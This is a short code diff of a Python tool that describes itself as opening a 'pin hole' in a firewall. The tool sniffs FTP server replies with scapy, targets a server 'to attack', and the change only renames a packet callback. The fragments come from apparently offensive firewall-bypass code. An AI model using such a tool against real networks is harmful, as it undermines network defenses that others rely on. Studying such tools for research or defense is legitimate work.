@@ -41,7 +41,7 @@ class ftp_helper(attack_target):
     def build_filter(self):
         return "tcp and src host %s and src port 21" % (self.ip)
 
-    def ftp_from_server_callback(self, pkt):
+    def server_callback(self, pkt):
         # match for login ok
         if self.sent == 0 and re.match("230",pkt.sprintf("%TCP.payload%")):
             if self.verbose:
@@ -86,7 +86,7 @@ class ftp_helper(attack_target):
         self.cv = threading.Condition()
         conn = threading.Thread(None, self.ftp_connect, args=(self,))
         conn.start()
-        sniff(iface=ftptarget.iface, prn=ftptarget.ftp_from_server_callback, filter=ftptarget.build_filter(), store=0)
+        sniff(iface=ftptarget.iface, prn=ftptarget.server_callback, filter=ftptarget.build_filter(), store=0)
 
 parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
 parser.add_argument('-s', '--server', default='192.168.2.2', help='IP address of server to attack')
